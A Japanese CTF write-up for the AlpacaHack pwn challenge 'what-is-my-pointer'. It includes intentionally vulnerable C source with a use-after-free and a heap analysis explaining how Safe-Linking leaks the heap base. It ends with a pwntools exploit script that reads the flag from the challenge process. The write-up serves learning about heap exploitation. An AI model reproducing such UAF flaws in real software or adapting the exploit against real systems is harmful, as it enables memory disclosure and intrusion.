---
title: Daily-AlpacaHack 「what-is-my-pointer」Hard Writeup
description: ヒープ領域のUAFを利用してベースアドレスを求め，flagアドレスの値の任意読み出しを行うPwn問題
date: 2026-07-26 00:10:00 +0900
categories: [CyberSecurity, CTF]
tags: [daily_alpaca_hack, pwn]
math: true
---

# 20260725-daily_alpaca-pwn-hard-what_is_my_pointer

## Summary

本問は，ヒープ領域のUAFを利用してベースアドレスを求め，flagアドレスの値の任意読み出しを行うPwn問題です．

> - **Category**: Pwn
> - **Description**: Use-After-Freeでできること2
> - **Tools & TechStack**:
>   - Python
>   - Pwninit
>   - Pwntools
>   - Pwndbg
> - **Release**: 2026/07/25
{: .prompt-info }

**階層構造**
```
.
├── chal
├── chal.c
├── compose.yml
├── Dockerfile
└── flag.txt

1 directory, 5 files
```

---
## プログラムの概要

**バイナリ保護機構**
```shell
$ checksec --file=chal
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

- **初期化処理**: `flag.txt` を読み込み，ヒープ上に確保した領域に内容を格納します．
- **メニュー操作 (while ループ内)**: ユーザーの入力に応じて以下の 4つの機能を実行します．
    - **1. allocate**: 0x20 バイトのヒープ領域を確保し，グローバル変数 `item` に保存します．
    - **2. free**: `item` のメモリ領域を解放します．**(解放後にポインタを NULL でクリアする処理はコメントアウトされています)**
    - **3. read**: `item` が指すメモリ領域の文字列を標準出力に表示します．
    - **4. print pointer**: ユーザーから入力された任意のメモリ領域のアドレスを受け取り，そのアドレスに保存されている文字列を表示します．

## ソースコードの調査

問題の説明文には，「**Use-After-Freeでできること2**」 と書いてあるため，`1,2,3,4` の選択肢を適切な順序で使用して，**heap** 領域の **UAF** を行い，`Flag` を読むのではないかと推測しました．  

また，メニューの `4` に渡すための **フラグが配置されているメモリ空間の先頭アドレス** が分かれば，Flag文字列を読み出すことができます．

`chal.c`
```c
// gcc chal.c -o chal
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#define __FILE__ "chal.c"

char *item;

void menu()
{
    puts("1. allocate");
    puts("2. free");
    puts("3. read");
    puts("4. print pointer");
}

int main(void)
{
    FILE *f_ptr = fopen("flag.txt", "r");
    if (f_ptr == NULL)
    {
        puts("open flag.txt failed. please open a ticket");
        exit(1);
    }
    fseek(f_ptr, 0, SEEK_END);
    long f_sz = ftell(f_ptr);
    fseek(f_ptr, 0, SEEK_SET);
    char *flag = malloc(f_sz);
    fgets(flag, f_sz, f_ptr);

    menu();

    while (1)
    {
        int choice;
        printf("choice> ");
        scanf("%d%*c", &choice);
        switch (choice)
        {
        // allocate
        case 1:
        {
            item = malloc(0x20); // 32バイト確保
        }
        break;
        // free
        case 2:
        {
            // item が NULL でなければ，free できる
            assert(item != NULL);
            free(item);
            // item == NULL; // 以降は item が NULL になる
        }
        break;
        // read
        case 3:
        {
            // item が NULL でなければ，標準出力
            assert(item != NULL);
            puts(item);
        }
        break;
        // print pointer
        case 4:
        {
            printf("pointer> ");
            char *ptr;
            // スタック上の ptr に，ユーザーが指定した任意のメモリ領域のアドレスがセットされる
            scanf("%p%*c", (void *)&ptr);
            // 指定アドレスの文字列読み出し
            printf("%s\n", ptr);
        }
        break;
        default:
        {
            exit(0);
        }
        }
    }
}

__attribute__((constructor)) void setup()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}
```

## メモリレイアウトの動的解析

同一環境下で解析を行うため，dockerコンテナからライブラリを抽出します．  
その後，`pwninit` コマンドを使用して `chal` バイナリをカレントディレクトリのライブラリにパッチします．以降は，パッチされたバイナリを解析します．

```shell
$ docker compose up -d

$ docker cp $(docker ps -q -f ancestor=what-is-my-pointer-pwn):/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6

$ docker cp -L $(docker ps -q -f ancestor=what-is-my-pointer-pwn):/lib64/ld-linux-x86-64.so.2 ./ld-linux-x86-64.so.2

$ nix-shell -p pwninit    

[nix-shell:~/wksp/sec/ctf/rev_and_pwn/what-is-my-pointer]$ pwninit
bin: ./chal
libc: ./libc.so.6
ld: ./ld-linux-x86-64.so.2

unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.39-0ubuntu8.7_amd64.deb
Found matching file: ./usr/lib/debug/.build-id/8e/9fd827446c24067541ac5390e6f527fb5947bb.debug
copying ./chal to ./chal_patched
running patchelf on ./chal_patched
writing solve.py stub
```

### `flag` のアドレス特定

**`disas main` の一部**
```shell
   0x00005c1e5cc4139a <+170>:   mov    rdx,QWORD PTR [rbp-0x20]
   0x00005c1e5cc4139e <+174>:   mov    rax,QWORD PTR [rbp-0x10]
   0x00005c1e5cc413a2 <+178>:   mov    esi,ecx
   0x00005c1e5cc413a4 <+180>:   mov    rdi,rax
   0x00005c1e5cc413a7 <+183>:   call   0x5c1e5cc41150 <fgets@plt>
   0x00005c1e5cc413ac <+188>:   mov    eax,0x0
   0x00005c1e5cc413b1 <+193>:   call   0x5c1e5cc412a9 <menu>
```

`b *main+188` で `flag` の読み込み直後にbpを貼り，読み込み直後のヒープを確認します．  
`fgets` の読み込み先の引数は `[rbp-0x10]` に保存されていまるため，そこに `flag` のヒープアドレスが入っているはずです．

```shell
pwndbg> p/x *(unsigned long*)($rbp - 0x10)
$2 = 0x55555555c490

pwndbg> x/s *(unsigned long*)($rbp - 0x10)
0x55555555c490: "Alpaca{REDACTED}"
```

`flag` のアドレスが `0x55555555c490` であると分かりました．

### ~~`item` を allocate し，`flag` とのオフセットを求める~~

**`disas main` の一部**
```shell
   0x000055555555541c <+300>:   call   0x555555555170 <malloc@plt>
   0x0000555555555421 <+305>:   mov    QWORD PTR [rip+0x2c08],rax        # 0x555555558030 <item>
   0x0000555555555428 <+312>:   jmp    0x555555555501 <main+529>
   0x000055555555542d <+317>:   mov    rax,QWORD PTR [rip+0x2bfc]        # 0x555555558030 <item>
   0x0000555555555434 <+324>:   test   rax,rax
```

`b *main+312` で ジャンプ前にbpを貼り，`continue` で `1` を選び，`item` を割り当てしてから，そのアドレスを調べます．

```shell
pwndbg> b *main+312
Breakpoint 2 at 0x555555555428
pwndbg> c
Continuing.
1. allocate
2. free
3. read
4. print pointer
choice> 1

pwndbg> x/gx &item
0x555555558030 <item>:  0x000055555555c4b0 # 右側がitem変数の値 (ヒープチャンクアドレス)

pwndbg> distance 0x55555555c490 0x000055555555c4b0
0x55555555c490->0x55555555c4b0 is 0x20 bytes (0x4 words)
```

- **`flag` のヒープアドレス**: `0x55555555c490`
- ~~**`item` のヒープアドレス**: `0x000055555555c4b0`~~
- ~~**`flag` と `item` のオフセット**: `0x20`~~

~~オフセットが判明したため，もし実行中のプログラムから `item` のヒープアドレスをリークさせることができれば，そのアドレスから `0x4460` を足すだけで，`flag` が存在する正確なアドレスを特定できます．~~

## UAFを利用したヒープ領域のベースアドレスのリーク

`1>2` で値を入力したとき，`item` が確保されすぐに `free()` されます．しかし，`// item == NULL;` とコメントアウトされていることからも，これはダングリングポインタであり `3` で解放後でも値を参照することができます．  

ここで，`free()` をした後に `glibc` の **メモリ管理機構(tcache)**[^1] によって，次のフリーチャンクへのポインタが書き込まれます．

- **(失敗) `item` アドレスとオフセットを利用して `flag` アドレスに到達する方法**[^2]

ここで，最初に考えていた方法が出来ないことが分かりました．  
そこで，AIに聞いてみると 「近年 (glibc 2.32以降) では，このNextポインタの書き換え攻撃を防ぐため，**Safe-Linking** という難読化機構が導入されました．メモリの先頭に書き込まれる値は，以下の **式(1)** で暗号化されます．」 と返答されました．

$$
書き込まれる値 = (自分のヒープアドレス \gg 12) \oplus (次のフリーチャンクのアドレス)\tag{1}
$$

これに従うと，今回は **item** が最初に解放されるチャンクであるため，次のフリーチャンクは存在せず `0` となるはずです．`0` は **XOR演算においての単位元** であるため，$自分のヒープアドレス >> 12 \ (16進数で右に3桁シフトした値)$ がそのまま書き込まれます．  
よって，以下のメモリ管理の特性より，左シフトすればヒープ領域のベースアドレスに戻ります．

> **ページの特性によるベースアドレスの導出**:  
>  
> OSはメモリを **4KB (4096 バイト = 0x1000)** を1として，**ページ** という単位で管理しています．  
> 16進数において，**ヒープ領域の先頭アドレスの下3桁は必ず `000` になります**．(`0x...000`)  
> また，今回は簡単な初期化処理と `item = malloc(0x20);` しか使用していないため，1ページ(4KB)より多くの上位アドレスは使用されないと推測しました．  
> そのため，下位3桁以外は変化しないはずです．
{: .prompt-tip }

これで，ヒープ領域ベースアドレスの入手方法が判明しました．  
また，`Flag` 取得に必要なオフセットは **式(2)** から計算でき，`0x490 (1,168)` であることが分かりました!

$$
0x55555555c490 \ (flag アドレス) - 0x55555555c000 \ (ベースアドレス) = 0x490 (flag アドレスオフセット)
$$

## 解法

`UAF` でリークさせたアドレスを12bit左シフトしてベースアドレスを求め，`flag` へのオフセットを足したものを `case 4` に入力することで `Flag` 文字列が入手できるはずです．

`exploit.py`
```python
from pwn import *

p = remote("localhost", 1337)

p.sendlineafter(b"choice> ", b"1")
p.sendlineafter(b"choice> ", b"2")
p.sendlineafter(b"choice> ", b"3")
res_bytes = int.from_bytes(p.recvline().rstrip(b"\n").ljust(8, b"\x00"), 'little')

base_addr = res_bytes << 12
log.info(f"Base Address: {hex(base_addr)}")

flag_addr = base_addr + 0x490 # オフセット加算
log.info(f"Target Flag Address: {hex(flag_addr)}")

p.sendlineafter(b"choice> ", b"4")
p.sendlineafter(b"pointer> ", hex(flag_addr).encode())
print(f"Flag: {p.recvline(timeout=1).decode()}")
```

```shell
$ python3 exploit.py
[+] Opening connection to localhost on port 1337: Done
[*] Base Address: 0x5e578d6a0000
[*] Target Flag Address: 0x5e578d6a0490
Flag: Alpaca{REDACTED}

[*] Closed connection to localhost port 1337
```

---
## Post-Mortem & Dead ends

最初は，`item` のアドレスと `flag` とのオフセットを求めて，何らかの方法で `item` の先頭アドレスをリークさせてそこから `flag` のアドレスを読み出す方法でやってたけど，普通にベースアドレスがリークできるとは...  
難しかったけど，久しぶりにHard解けて面白かった~!

## References

[^1]: `glibc` では，メモリが `free()` されると，その後の再利用を速くするために **tcache (Thread Local Caching)** という単方向リストで管理します．<br>メモリが解放されると，その領域の **先頭8バイト** に **次に再利用されるべきフリーチャンクのアドレス (fd / Nextポインタ)** が自動的に書き込まれます．

[^2]: `1>2` に続き `3` でそのアドレスをでリークさせ，アドレスとオフセットを用いて，`Flag` が取得できるか試してみましたができませんでした．<br>これは，**Safe-Linking** によって `item` アドレスは右12bitシフトされ，下位3桁のアドレスは失われているためです．そのため，`item` の正確なアドレスは取得できませんでした．
